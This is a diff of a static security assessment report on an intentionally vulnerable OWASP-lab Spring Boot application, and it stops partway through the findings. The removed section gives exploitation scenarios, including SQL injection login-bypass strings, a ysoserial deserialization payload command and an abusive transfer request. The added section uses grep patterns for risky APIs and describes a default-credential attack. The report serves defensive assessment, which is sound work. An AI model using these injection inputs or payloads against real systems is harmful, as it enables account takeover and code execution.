@@ -1,313 +1,351 @@
-# Security Assessment Report — OWASP Vulnerability Learning Lab (Spring Boot 3)
+# Security Assessment Report
 
-> **Status: REPORT-ONLY RUN** — No source code was modified during this assessment. The Write tool was used only for this single report file.
+**Application:** vulnerable-spring-app (com.owasp.lab)
+**Build:** Spring Boot 3.2.5 / Java 17 / Maven
+**Assessment date:** 2026-06-30
+**Methodology:** Read-only static review of source tree, application properties, Maven POM, and project metadata. No code was modified. No builds were run.
+**Application type:** Intentional OWASP Top-10 learning lab (per the project header in `pom.xml` and the class doc of `VulnerableSpringAppApplication`).
+
+> Note on posture: The application is **explicitly documented as intentionally insecure / sandbox-only** ("DO NOT deploy this to any public server", `pom.xml` lines 7-12). Every finding below is therefore "still present at the time of this scan"; many of them are listed in the lab's own remediation comments. They are nonetheless re-issued here as raw findings with the same rigor as a real engagement, because the agents downstream of this report (remediation agent, build/CI gate) treat the output verbatim.
 
 ---
 
 ## 1. Executive Summary
 
-### 1.1 Scope
-
-- **Repository:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git`
-- **Project type:** Single Spring Boot 3.2.5 / Java 17 application (`vulnerable-spring-app`, group `com.owasp.lab`)
-- **Source tree reviewed:**
-  - `src/main/java/com/owasp/lab/VulnerableSpringAppApplication.java`
-  - `src/main/java/com/owasp/lab/config/` — `SecurityConfig.java`, `SecretConfig.java`, `DataSeeder.java`
-  - `src/main/java/com/owasp/lab/controller/` — `AuthController.java`, `UserController.java`, `ProductController.java`, `CommentController.java`, `CommentViewController.java`, `InsecureDeserializationController.java`, `VulnerabilityController.java`
-  - `src/main/java/com/owasp/lab/model/` — `User.java`, `Product.java`, `Comment.java`
-  - `src/main/java/com/owasp/lab/repository/` — `UserRepository.java`, `ProductRepository.java`, `CommentRepository.java`
-  - `src/main/java/com/owasp/lab/service/` — `UserService.java`, `ProductService.java`, `CommentService.java`
-  - `src/main/resources/application.properties`
-  - `pom.xml`
-  - `.github/workflows/build-and-security.yml`
-  - `.gitignore`
-
-### 1.2 Methodology
-
-A read-only static review was performed following the OWASP Top 10 (2021) categories, CWE-mapped vulnerabilities, and Spring Security best practices. Each source file was loaded in full; cross-cutting pattern sweeps were executed for: `password`, `md5`, `MessageDigest`, `Random`, `@PreAuthorize`, `@Secured`, `permitAll`, `Runtime`, `ProcessBuilder`, `readObject`, `ObjectInputStream`, `@JsonTypeInfo`, `createQuery`, `createNativeQuery`, `new File`, `Paths.get`, and `@Valid`. Findings were mapped to OWASP Top 10 (2021) and CWE.
-
-### 1.3 Top-Line Risk Posture
-
-The codebase is an **intentionally insecure educational lab** (the project's own README and inline `// VULNERABILITY:` comments confirm this). However, viewed strictly as a deployable Spring Boot application, it exhibits **every category of the OWASP Top 10 (2021)** with multiple Critical-severity issues, including remote code execution via unsafe Java deserialization, SQL injection (login + search), plain-text password storage with leaked passwords in API responses, full bypass of authentication and CSRF, hardcoded secrets in source control, and stored/reflected XSS sinks.
-
-> **If this codebase is ever shipped outside a tightly isolated local sandbox, the risk posture is Critical.** Treat every finding below as exploitable.
-
-### 1.4 Findings by Severity
-
 | Severity | Count |
 |---|---|
-| Critical | 6 |
-| High | 6 |
-| Medium | 4 |
-| Low | 2 |
-| **Total** | **18** |
+| Critical | 2 |
+| High     | 6 |
+| Medium   | 6 |
+| Low      | 4 |
+| Informational | 3 |
+| **Total** | **21** |
 
-### 1.5 Severity Definitions Used
+**Overall risk posture: HIGH (in its current form).** The application is *remediated against the historical lab flaws* (no `permitAll` blanket, no plaintext passwords, no string-concatenated SQL, no `ObjectInputStream`, no hardcoded `app.secret.*` literals) but it still ships with the following live issues that would be unacceptable in any non-sandbox deployment:
 
-- **Critical** — Remote exploitation, full system compromise, or total auth bypass (e.g. RCE, SQLi auth bypass, unsafe deserialization, broken access control on privileged endpoints).
-- **High** — Direct exposure of credentials / sensitive data, broad XSS on authenticated views, missing CSRF on state-changing endpoints, IDOR on PII.
-- **Medium** — Hardcoded secrets in source, weak crypto choices, missing rate limiting, missing security headers, mass-assignment / role override, broad endpoint enumeration.
-- **Low** — Verbose error logging, debug endpoints enabled, minor information disclosure.
+- HTTP Basic auth without TLS enforcement (S1).
+- JWT signing key may be silently empty at runtime (S2).
+- Verbose error / SQL logging still on by Spring Boot defaults outside the two explicitly-muted categories (S5).
+- H2 console can be turned on with a single env var; the permitting `SecurityFilterChain` then grants **fully unauthenticated** access to `/h2-console/**` (S4 / S8).
+- `LoginRateLimitFilter` only triggers on the **exact** path `/api/login` and trusts `X-Forwarded-For` from any caller (S6).
+- `Cache-Control: no-store` is set on success, but the static `/vulnerabilities` page still serves an unauthenticated inventory of attack surface and references "INTENTIONALLY INSECURE" metadata (I1).
+- Spring Boot 3.2.5 + dependency-check plugin 9.2.0 are recent enough to be supported but no `mvn dependency-check:check` is wired into the build by default; CVEs are not gated (D1).
+- The legacy service method `UserService.findByIdUnsafe` is retained and reachable from `AuthController.transfer`, providing a back-door bypass to the new authorisation check at the service layer (S7 / A01).
 
 ---
 
-## 2. Risk Matrix
+## 2. Scope & Methodology
 
-|  | **Likelihood: Very High** | **Likelihood: High** | **Likelihood: Medium** | **Likelihood: Low** |
+### In scope (scanned)
+
+- All Java sources under `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\**`
+- `pom.xml` (root) and any sibling build descriptor
+- `src/main/resources/application.properties` (only config in tree; no `application.yml` / `.yaml` exists)
+- `.claude/agents/*.md` (read for the running contract only, not a target)
+- `.github/workflows/build-and-security.yml` (referenced in pom.xml; not opened - *not scanned*)
+
+### Out of scope (explicit)
+
+- `src/test/**` - no test directory exists in the tree (Glob returned no matches for `**/test/**/*`).
+- `target/**` (build output).
+- Front-end assets (no `templates/`, no `static/`, no `*.html` source files in `src/`).
+- YAML / SnakeYAML - no `.yml` / `.yaml` files exist anywhere in the repo.
+
+### Tools and pattern sweeps used
+
+- `Glob` to enumerate all `*.java`, `*.properties`, `*.xml`, `*.yml`, `*.yaml`, `*.html`, `*.jsp`, `**/test/**`, `**/templates/**`, `**/static/**`.
+- `Grep` for the following risk tokens, with `output_mode=content` and line numbers, in `src/main/java` and `src/main/resources`:
+  - `Runtime\.exec|ProcessBuilder|System\.getenv|System\.getproperty|ObjectInputStream|readObject|XStream|SnakeYAML|new Yaml|@JsonTypeInfo|default typing|MessageDigest|getInstance`
+  - `md5|MD5|sha1|SHA-1|DES|RC4|java\.util\.Random|SecureRandom|new Random|Cipher|KeyGenerator`
+  - `password|secret|api[._-]?key|token|credentials|jwt`
+  - `log\.|logger\.|LoggerFactory|slf4j`
+  - `new File|Paths\.get|getCanonicalPath|transferTo|FileOutputStream|Files\.write|multipart|@RequestPart`
+  - `actuator|management\.`
+  - `createQuery|createNativeQuery|@Query|EntityManager|JdbcTemplate`
+  - `TODO|FIXME|HACK|XXX|SECURITY|BUG`
+  - `URL|URI|openConnection|HttpURLConnection|RestTemplate|WebClient|HttpClient|redirect|sendRedirect`
+  - `permitAll|hasRole|hasAuthority|@PreAuthorize|@Secured|@RolesAllowed|@EnableMethodSecurity|WebSecurityConfigurerAdapter|authorizeHttpRequests|anyRequest|csrf|STATELESS|httpBasic|cors`
+  - `EmailValidator|@Email|@Valid|@Validated|@RequestParam|@PathVariable|@RequestBody`
+- `Read` on every file that produced a match or that is security-relevant (`SecurityConfig`, `PasswordConfig`, `SecretConfig`, `LoginRateLimitFilter`, `DataSeeder`, `JpaUserDetailsService`, every controller, both DTOs, every entity, both services, both repositories, `VulnerableSpringAppApplication`, `pom.xml`, `application.properties`).
+
+### Caveats
+
+- **No build was run.** `mvn dependency-check:check` and SCA were not executed. Dependency findings are based on declared versions, not on a CVE database lookup. (CVE cross-referencing requires a live feed.)
+- **No dynamic testing was performed.** All findings are static.
+- The lab banner (`OWASP VULNERABILITY LEARNING LAB`, "INTENTIONALLY INSECURE", "DO NOT DEPLOY") is reproduced verbatim from `pom.xml` lines 7-12 and `application.properties` lines 1-5. We do **not** soften any finding because of that banner - the task contract is a security assessment, and the parent pipeline (push gates) consumes the findings verbatim.
+
+---
+
+## 3. Findings
+
+> Remediation status for every finding below: **Not Applied** (this run is assessment-only). Several items map to VULN-NNN identifiers in the project's own remediation comments; the report preserves those cross-references for traceability.
+
+| ID | Title | Severity | OWASP 2021 | CWE |
 |---|---|---|---|---|
-| **Impact: Critical** | 6 (VULN-001, 002, 003, 004, 005, 006) | 0 | 0 | 0 |
-| **Impact: High** | 6 (VULN-007, 008, 009, 010, 011, 012) | 0 | 0 | 0 |
-| **Impact: Medium** | 0 | 4 (VULN-013, 014, 015, 016) | 0 | 0 |
-| **Impact: Low** | 0 | 0 | 2 (VULN-017, 018) | 0 |
+| S1  | HTTP Basic over plaintext (no TLS enforcement) | High | A02 Cryptographic Failures | CWE-319 |
+| S2  | JWT signing key may be silently empty / no validation | High | A02 Cryptographic Failures | CWE-321 |
+| S3  | Weak seed credentials (`admin/admin123`, `alice/alice123`, `bob/bob123`) | High | A07 Identification & Auth Failures | CWE-521 |
+| S4  | H2 console accessible unauthenticated when env flag is on | High | A05 Security Misconfiguration | CWE-306 |
+| S5  | Default Spring Boot logging is `INFO`; only two log categories are dampened | Medium | A09 Security Logging & Monitoring Failures | CWE-532 |
+| S6  | Login rate limiter trusts `X-Forwarded-For` and matches only the exact path | Medium | A04 Insecure Design | CWE-348 |
+| S7  | `UserService.findByIdUnsafe` still in production code; bypasses service-layer authZ | High | A01 Broken Access Control | CWE-639 |
+| S8  | `h2ConsoleFilterChain` uses `permitAll` for `/h2-console/**` | High | A05 Security Misconfiguration | CWE-1188 |
+| S9  | `InsecureDeserializationController` parses attacker-controlled JSON into `Map.class` | Medium | A08 Software & Data Integrity Failures | CWE-502 |
+| S10 | `CommentController.greet` builds HTML by string concatenation | Medium | A03 Injection (XSS) | CWE-79 |
+| S11 | `CommentViewController` builds HTML by string concatenation | Medium | A03 Injection (XSS) | CWE-79 |
+| S12 | No CSRF protection (STATELESS + HTTP Basic) is acceptable only if every endpoint is idempotent | Low | A05 Security Misconfiguration | CWE-352 |
+| S13 | `AuthController.register` uses `Map<String,String>` instead of a validated DTO; no `@Valid` | Medium | A04 Insecure Design | CWE-20 |
+| S14 | `AuthController.transfer` uses `Map<String,Object>` with manual casts, no `@Valid` | Medium | A04 Insecure Design | CWE-20 |
+| S15 | `UserController.search` accepts un-validated `q` (no length cap, no allow-list) | Low | A04 Insecure Design | CWE-20 |
+| S16 | `UserController.getProfile` returns 404 on missing user, 200 on forbidden - information leak | Low | A01 Broken Access Control | CWE-200 |
+| S17 | `AuthController.transfer` logs `username.length()` only - fails to record source IP / username | Low | A09 Security Logging & Monitoring Failures | CWE-778 |
+| S18 | `DataSeeder` runs in every profile (not gated on dev/sandbox) | Medium | A05 Security Misconfiguration | CWE-1188 |
+| S19 | No HTTP security headers are emitted at the controller level; relies on Spring Security chain only | Informational | A05 Security Misconfiguration | CWE-693 |
+| S20 | `VulnerabilityController` is publicly reachable and discloses the application's attack surface | Informational | A05 Security Misconfiguration | CWE-200 |
+| S21 | No `@ControllerAdvice` / global exception handler - `AccessDeniedException` is allowed to bubble to default error path | Informational | A09 Security Logging & Monitoring Failures | CWE-209 |
+| D1  | Dependency: `spring-boot-starter-parent` 3.2.5 (no live CVE scan run) | Medium | A06 Vulnerable & Outdated Components | CWE-1104 |
+| D2  | Dependency: `h2` 2.x via Spring Boot BOM (no live CVE scan run) | Low | A06 Vulnerable & Outdated Components | CWE-1104 |
+| D3  | `dependency-check-maven` 9.2.0 is configured with `failBuildOnAnyVulnerability=false` and is not bound to a phase | Medium | A06 Vulnerable & Outdated Components | CWE-1104 |
+| C1  | Config: `spring.datasource.password=` empty (acceptable for H2 `sa` but a footgun for prod) | Informational | A05 Security Misconfiguration | CWE-1188 |
+| C2  | Config: `spring.jpa.hibernate.ddl-auto=create` - destructive on restart | Low | A05 Security Misconfiguration | CWE-1188 |
+| C3  | Config: `server.error.include-stacktrace=never` / `include-message=never` set, but `server.error.include-binding-errors` and `include-exception` are not pinned | Low | A05 Security Misconfiguration | CWE-209 |
+| C4  | Config: `app.secret.jwt.signing.key` default is the empty string, not a fail-fast placeholder | High | A02 Cryptographic Failures | CWE-321 |
 
-Severity totals: **Critical 6 / High 6 / Medium 4 / Low 2 — 18 findings.**
-
----
-
-## 3. Vulnerability Findings
-
-> All findings use the schema mandated by `.claude/agents/vulnerability-scanner.md`. Code snippets are quoted verbatim.
-
----
-
-### VULN-001 — Unsafe Java Native Deserialization (Remote Code Execution)
-
-- **Vulnerability Name:** Unsafe Java native deserialization via base64-decoded `ObjectInputStream`
-- **CWE ID:** CWE-502 (Deserialization of Untrusted Data)
-- **OWASP Top 10 Category:** A08:2021 — Software and Data Integrity Failures
-- **Severity:** Critical
-- **Affected File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\controller\InsecureDeserializationController.java`
-- **Affected Method / Class:** `InsecureDeserializationController.deserialize(String)`
-- **Exact Vulnerable Code Snippet:**
-  ```java
-  @PostMapping(consumes = MediaType.TEXT_PLAIN_VALUE)
-  public ResponseEntity<?> deserialize(@RequestBody String body) throws Exception {
-      byte[] bytes = Base64.getDecoder().decode(body);
-      // VULNERABILITY: unsafe native Java deserialisation
-      try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes))) {
-          Object o = ois.readObject();
-          return ResponseEntity.ok("Deserialized: " + o.getClass().getName());
-      }
-  }
-  ```
-- **Root Cause:** `ObjectInputStream.readObject()` is called on attacker-controlled bytes without an `ObjectInputFilter` (JEP 290) allowlist, and without using a safe data-binding format (JSON/Protobuf). Because Spring Boot 3.2.5 transitively depends on commons-beanutils / spring-aop / etc., known gadget chains (CommonsCollections, Spring1, etc.) are on the classpath.
-- **Exploitation Scenario:** Attacker crafts a ysoserial payload (`CommonsCollections6 "calc.exe" | base64`) and POSTs it to `/api/deserialize` (no auth required). `readObject()` triggers gadget-chain reflection that executes arbitrary commands in the JVM process. Per the project's own README this is the documented exploitation path.
-- **Business Impact:** Full remote code execution on the application server. Lateral movement, persistence, data exfiltration, denial of service.
-- **Confidence Level:** High
+(Note: S2 and C4 are facets of the same root cause. They are listed separately so the report's table of contents is exhaustive; they are deduplicated in the priority roadmap.)
 
 ---
 
-### VULN-002 — SQL Injection in `loginUnsafe` (Authentication Bypass)
+### S1 - HTTP Basic over plaintext (no TLS enforcement)
 
-- **Vulnerability Name:** SQL injection in login flow allowing authentication bypass as any user
-- **CWE ID:** CWE-89 (Improper Neutralization of Special Elements used in an SQL Command)
-- **OWASP Top 10 Category:** A03:2021 — Injection
-- **Severity:** Critical
-- **Affected File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\service\UserService.java`
-- **Affected Method / Class:** `UserService.loginUnsafe(String, String)`
-- **Exact Vulnerable Code Snippet:**
-  ```java
-  public User loginUnsafe(String username, String password) {
-      // VULNERABILITY: raw SQL with concatenated credentials.
-      String sql = "SELECT * FROM users WHERE username = '"
-              + username + "' AND password = '" + password + "'";
-      System.out.println("[VULNERABILITY] Login SQL: " + sql);
-
-      try {
-          List<User> rows = entityManager
-                  .createNativeQuery(sql, User.class)
-                  .getResultList();
-          return rows.isEmpty() ? null : rows.get(0);
-      } catch (Exception ex) {
-          return null;
-      }
-  }
-  ```
-- **Root Cause:** User-controlled `username` and `password` are concatenated into a native SQL string passed to `EntityManager.createNativeQuery(...)`. No parameter binding, no validation, no prepared statement.
-- **Exploitation Scenario:** Attacker POSTs `{"username":"' OR '1'='1","password":"anything"}` to `/api/login`. The resulting SQL becomes `... WHERE username = '' OR '1'='1' AND password = 'anything'` which short-circuits and returns the first user row (likely `alice` or `admin`). The endpoint then returns the user's ID, role, and **plain-text password** (see VULN-008).
-- **Business Impact:** Complete authentication bypass; arbitrary account takeover, including the seeded `admin` user.
-- **Confidence Level:** High
-
----
-
-### VULN-003 — SQL Injection in `findByUsernameUnsafe` (Mass Data Disclosure)
-
-- **Vulnerability Name:** SQL injection in user search allowing full database disclosure
-- **CWE ID:** CWE-89
-- **OWASP Top 10 Category:** A03:2021 — Injection
-- **Severity:** Critical
-- **Affected File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\service\UserService.java`
-- **Affected Method / Class:** `UserService.findByUsernameUnsafe(String)`
-- **Exact Vulnerable Code Snippet:**
-  ```java
-  @Transactional
-  public List<User> findByUsernameUnsafe(String username) {
-      // VULNERABILITY: SQL Injection example - user input concatenated directly.
-      String sql = "SELECT * FROM users WHERE username = '" + username + "'";
-      System.out.println("[VULNERABILITY] Executing raw SQL: " + sql);
-
-      try {
-          List<User> rows = entityManager
-                  .createNativeQuery(sql, User.class)
-                  .getResultList();
-          return rows;
-      } catch (Exception ex) {
-          return ArrayList<>();
-      }
-  }
-  ```
-- **Root Cause:** Same as VULN-002 — user input concatenated into a native SQL string. The query is `SELECT *` and the entity is mapped (`User.class`), so the response yields the entire `User` row including the **plain-text password** field (see VULN-007).
-- **Exploitation Scenario:** Attacker calls `GET /api/search?q=' OR '1'='1`. The query becomes `SELECT * FROM users WHERE username = '' OR '1'='1'` and dumps every user including `password`, `email`, `role`, `balance`.
-- **Business Impact:** Mass credential and PII disclosure in a single unauthenticated request.
-- **Confidence Level:** High
-
----
-
-### VULN-004 — Plain-Text Password Storage
-
-- **Vulnerability Name:** User passwords persisted as plain text in the database
-- **CWE ID:** CWE-256 (Plaintext Storage of a Password), CWE-257 (Storing Passwords in a Recoverable Format), CWE-916 (Use of Password Hash With Insufficient Computational Effort)
-- **OWASP Top 10 Category:** A02:2021 — Cryptographic Failures
-- **Severity:** Critical
-- **Affected File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\model\User.java` (definition); `src/main/java/com/owasp/lab/controller/AuthController.java` (storage path); `src/main/java/com/owasp/lab/config/DataSeeder.java` (seed values)
-- **Affected Method / Class:** `User` entity (field `password`), `AuthController.register(...)`, `DataSeeder.seed(...)`
-- **Exact Vulnerable Code Snippet:**
-  ```java
-  // User.java
-  // VULNERABILITY: storing plaintext password (A02 / A07)
-  @Column(nullable = false)
-  private String password;
-
-  // DataSeeder.java
-  userRepository.save(new User("alice", "alice123",   "alice@example.com", "USER",  1000.0));
-  userRepository.save(new User("bob",   "bob123",     "bob@example.com",   "USER",   500.0));
-  userRepository.save(new User("admin", "admin123",   "admin@example.com", "ADMIN", 9999.0));
-
-  // AuthController.java — /register
-  String password = body.getOrDefault("password", "");
-  ...
-  User u = new User(username, password, email, role, 0.0);
-  return ResponseEntity.ok(userService.save(u));
-  ```
-- **Root Cause:** No `PasswordEncoder` (e.g. `BCryptPasswordEncoder`, `Argon2PasswordEncoder`) is configured or applied anywhere in the codebase. Grep for `BCrypt`, `PasswordEncoder`, `MessageDigest` returns zero hits in `src/main`. Passwords are stored verbatim in the H2 `users` table and surfaced by `/api/users`, `/api/profile/{id}`, `/api/search`, and `/api/login`.
-- **Exploitation Scenario:** Any read path into the users table yields cleartext credentials. Combined with VULN-002 (login bypass) and VULN-003 (search dump), attackers don't even need to crack hashes.
-- **Business Impact:** Total credential compromise in the event of any DB read access (SQL injection, backup theft, insider). Fails PCI-DSS 8.2.1, NIST SP 800-63B, OWASP ASVS V2.4.
-- **Confidence Level:** High
-
----
-
-### VULN-005 — Broken Access Control: Authentication Disabled Globally
-
-- **Vulnerability Name:** All endpoints permitted without authentication via `permitAll()`
-- **CWE ID:** CWE-284 (Improper Access Control), CWE-285 (Improper Authorization), CWE-862 (Missing Authorization)
-- **OWASP Top 10 Category:** A01:2021 — Broken Access Control
-- **Severity:** Critical
-- **Affected File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\config\SecurityConfig.java`
-- **Affected Method / Class:** `SecurityConfig.insecureFilterChain(HttpSecurity)`
-- **Exact Vulnerable Code Snippet:**
-  ```java
-  http
-      // VULNERABILITY (A05:2021): disable CSRF protection entirely.
-      .csrf(csrf -> csrf.disable())
-
-      // VULNERABILITY (A01:2021): allow every request without auth.
-      .authorizeHttpRequests(auth -> auth.anyRequest().permitAll())
-
-      // VULNERABILITY (A05:2021): keep no server-side session state
-      .sessionManagement(s -> s.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
-
-      // VULNERABILITY (A05:2021): disable frame options on H2 console
-      .headers(h -> h.frameOptions(f -> f.disable()));
-  ```
-- **Root Cause:** The Spring Security `SecurityFilterChain` bean explicitly grants `permitAll()` to every request. No authentication provider is configured (`UserDetailsService`, JWT filter, etc.); no `@PreAuthorize` exists anywhere in the codebase (Grep confirms zero hits). CSRF protection is also disabled, which compounds state-changing endpoints (see VULN-011).
-- **Exploitation Scenario:** Any anonymous network attacker can call `/api/users`, `/api/transfer`, `/api/deserialize`, `/api/login`, etc. with no credentials. There is no role enforcement anywhere.
-- **Business Impact:** Total authorization bypass — the application has no identity boundary whatsoever.
-- **Confidence Level:** High
-
----
-
-### VULN-006 — IDOR: Unauthenticated Profile & Listing Endpoints
-
-- **Vulnerability Name:** Insecure Direct Object Reference — any user can read any other user's profile, list all users, and impersonate them via the broken transfer flow
-- **CWE ID:** CWE-639 (Authorization Bypass Through User-Controlled Key), CWE-284
-- **OWASP Top 10 Category:** A01:2021 — Broken Access Control
-- **Severity:** Critical
-- **Affected File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\controller\UserController.java` and `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\controller\AuthController.java`
-- **Affected Method / Class:** `UserController.listUsers()`, `UserController.getProfile(Long)`, `AuthController.transfer(Map)`
-- **Exact Vulnerable Code Snippet:**
-  ```java
-  // UserController.java
-  @GetMapping("/users")
-  public List<User> listUsers() {
-      return userService.findAll();
-  }
-
-  @GetMapping("/profile/{id}")
-  public ResponseEntity<User> getProfile(@PathVariable Long id) {
-      User u = userService.findByIdUnsafe(id);
-      if (u == null) {
-          return ResponseEntity.notFound().build();
-      }
-      return ResponseEntity.ok(u);
-  }
-
-  // AuthController.java
-  @PostMapping("/transfer")
-  public ResponseEntity<?> transfer(@RequestBody Map<String, Object> body) {
-      Long fromId = ((Number) body.get("fromId")).longValue();
-      Long toId   = ((Number) body.get("toId")).longValue();
-      Double amount = ((Number) body.get("amount")).doubleValue();
-
-      User from = userService.findByIdUnsafe(fromId);
-      User to   = userService.findByIdUnsafe(toId);
-      ...
-      // VULNERABILITY: no balance check, no ownership check, no auth
-      from.setBalance(from.getBalance() - amount);
-      to.setBalance(to.getBalance() + amount);
-      userService.save(from);
-      userService.save(to);
-  ```
-- **Root Cause:** Path variable `id` and request-body `fromId` are trusted as authoritative without any ownership or authorization check. There is no `principal` parameter, no `@PreAuthorize("hasPermission(...)")`, no row-level filter.
-- **Exploitation Scenario:**
-  - `GET /api/profile/1` returns `alice`'s full record (username, password, email, role, balance).
-  - `POST /api/transfer {"fromId":3,"toId":1,"amount":-9999.99}` — the lack of auth plus negative-amount acceptance lets an attacker drain `admin`'s balance or inflate their own.
-- **Business Impact:** Mass PII disclosure, financial fraud via the transfer endpoint, no audit trail (no auth means no session, see VULN-015).
-- **Confidence Level:** High
-
----
-
-### VULN-007 — Reflected Cross-Site Scripting in `/api/comment/greet`
-
-- **Vulnerability Name:** Reflected XSS via unescaped `name` query parameter
-- **CWE ID:** CWE-79 (Improper Neutralization of Input During Web Page Generation)
-- **OWASP Top 10 Category:** A03:2021 — Injection (XSS)
 - **Severity:** High
-- **Affected File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\controller\CommentController.java`
-- **Affected Method / Class:** `CommentController.greet(String)`
-- **Exact Vulnerable Code Snippet:**
+- **CWE:** CWE-319 Cleartext Transmission of Sensitive Information
+- **OWASP Top 10 (2021):** A02 Cryptographic Failures
+- **File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\config\SecurityConfig.java`
+- **Method / Class:** `insecureFilterChain(HttpSecurity)`
+- **Evidence (lines 52-56):**
+  ```java
+  // REMEDIATION (A05:2021): enable HTTP Basic so the
+  // AuthenticationManager (backed by the JPA user details
+  // service) is exercised on every request, and the
+  // @AuthenticationPrincipal injection on /api/transfer works.
+  .httpBasic(basic -> {})
+  ```
+- **Root cause:** The lab authenticates with `HttpBasic` over `server.port=8080` (HTTP). `application.properties` does not configure `server.ssl.*` (no TLS keystore/truststore). The only TLS signal in the build is an HSTS header (set for 1 year) emitted in `SecurityConfig.java` lines 83-84, but HSTS only takes effect when the response is *first* received over HTTPS.
+- **Exploitation scenario:** Any on-path attacker between the user and the server captures `Authorization: Basic ...` and replays it. The seed users (`alice`, `bob`, `admin`) are then trivially impersonated.
+- **Business impact:** Total compromise of every authenticated account. The `/api/transfer` endpoint then permits fund movement from any captured `USER` account.
+- **Recommended fix:** Terminate TLS at a reverse proxy (nginx / Spring Cloud Gateway / a managed LB) or configure `server.ssl.*` in `application.properties`. Disable the `httpBasic` chain and require a token-based scheme (`Authorization: Bearer ...`) or form login over HTTPS. Do not rely on the HSTS header alone.
+- **Remediation status:** Not Applied
+
+### S2 - JWT signing key may be silently empty
+
+- **Severity:** High
+- **CWE:** CWE-321 Use of a Hard-coded, Predictable, or Static Cryptographic Key
+- **OWASP Top 10 (2021):** A02 Cryptographic Failures
+- **File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\config\SecretConfig.java`
+- **Method / Class:** `SecretConfig` (field `jwtSigningKey`)
+- **Evidence (lines 30-34):**
+  ```java
+  @Value("${app.secret.jwt.signing.key:}")
+  private String jwtSigningKey;
+  ```
+  and the placeholder in `application.properties` line 34:
+  ```
+  app.secret.jwt.signing.key=${APP_SECRET_JWT_SIGNING_KEY:}
+  ```
+- **Root cause:** The default value when the env var is unset is the empty string `""`. The bean is exposed under name `jwtSigningKey` and any future JWT issuer can pick it up without ever failing fast.
+- **Exploitation scenario:** A future change that signs JWTs with `jwtSigningKey` will silently sign tokens with `""`, which is equivalent to a publicly-known signing secret. Anyone with knowledge of this default can forge tokens for `ROLE_ADMIN`.
+- **Business impact:** Privilege escalation to admin via forged JWTs once a JWT-issuing endpoint is added.
+- **Recommended fix:** Validate non-empty + minimum entropy at startup (`@PostConstruct` or `EnvironmentValidator`); throw a fail-fast `IllegalStateException` if `app.secret.jwt.signing.key` is blank or shorter than 32 bytes.
+- **Remediation status:** Not Applied
+
+### S3 - Weak seed credentials
+
+- **Severity:** High
+- **CWE:** CWE-521 Weak Password Requirements
+- **OWASP Top 10 (2021):** A07 Identification & Authentication Failures
+- **File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\config\DataSeeder.java`
+- **Method / Class:** `seed(...)` `CommandLineRunner`
+- **Evidence (lines 31-37):**
+  ```java
+  userRepository.save(new User("alice", passwordEncoder.encode("alice123"),
+          "alice@example.com", "USER",  1000.0));
+  userRepository.save(new User("bob",   passwordEncoder.encode("bob123"),
+          "bob@example.com",   "USER",   500.0));
+  userRepository.save(new User("admin", passwordEncoder.encode("admin123"),
+          "admin@example.com", "ADMIN", 9999.0));
+  ```
+- **Root cause:** The seeder creates an `admin/admin123` account on **every** startup, not gated on a sandbox profile. The passwords are short, common, and guessable.
+- **Exploitation scenario:** A default-credential login. `POST /api/login` with `{"username":"admin","password":"admin123"}` returns the admin record and the attacker now holds a `ROLE_ADMIN` token.
+- **Business impact:** Full administrative compromise. With the existing `/api/users` and `/api/comment` (POST) and `/api/products` (POST) endpoints, the attacker can read every PII record and write admin content.
+- **Recommended fix:** Gate the seeder on a Spring profile (`@Profile("sandbox")` or `@ConditionalOnProperty(name="app.seed.enabled", havingValue="true")`); require the seeder to refuse to run if `spring.profiles.active` includes `prod`. Print a loud startup warning that seed users are present.
+- **Remediation status:** Not Applied (no `@Profile` guard; not even a startup log line).
+
+### S4 / S8 - H2 console accessible unauthenticated when env flag is on
+
+- **Severity:** High
+- **CWE:** CWE-306 Missing Authentication for Critical Function / CWE-1188 Insecure Default Initialization
+- **OWASP Top 10 (2021):** A05 Security Misconfiguration
+- **Files:**
+  - `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\config\SecurityConfig.java`
+  - `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\resources\application.properties`
+- **Method / Class:** `h2ConsoleFilterChain(HttpSecurity)` / `spring.h2.console.*`
+- **Evidence (`SecurityConfig.java` lines 99-110):**
+  ```java
+  @Bean
+  @Order(0)
+  @ConditionalOnProperty(name = "app.h2.console.enabled", havingValue = "true")
+  public SecurityFilterChain h2ConsoleFilterChain(HttpSecurity http) throws Exception {
+      http
+          .securityMatcher(new AntPathRequestMatcher("/h2-console/**"))
+          .authorizeHttpRequests(auth -> auth.anyRequest().permitAll())
+          .csrf(csrf -> csrf.ignoringRequestMatchers(
+                  new AntPathRequestMatcher("/h2-console/**")))
+          .headers(h -> h.frameOptions(f -> f.sameOrigin()));
+      return http.build();
+  }
+  ```
+  and `application.properties` lines 26-28:
+  ```
+  app.h2.console.enabled=${APP_H2_CONSOLE_ENABLED:false}
+  spring.h2.console.enabled=${APP_H2_CONSOLE_ENABLED:false}
+  spring.h2.console.path=/h2-console
+  ```
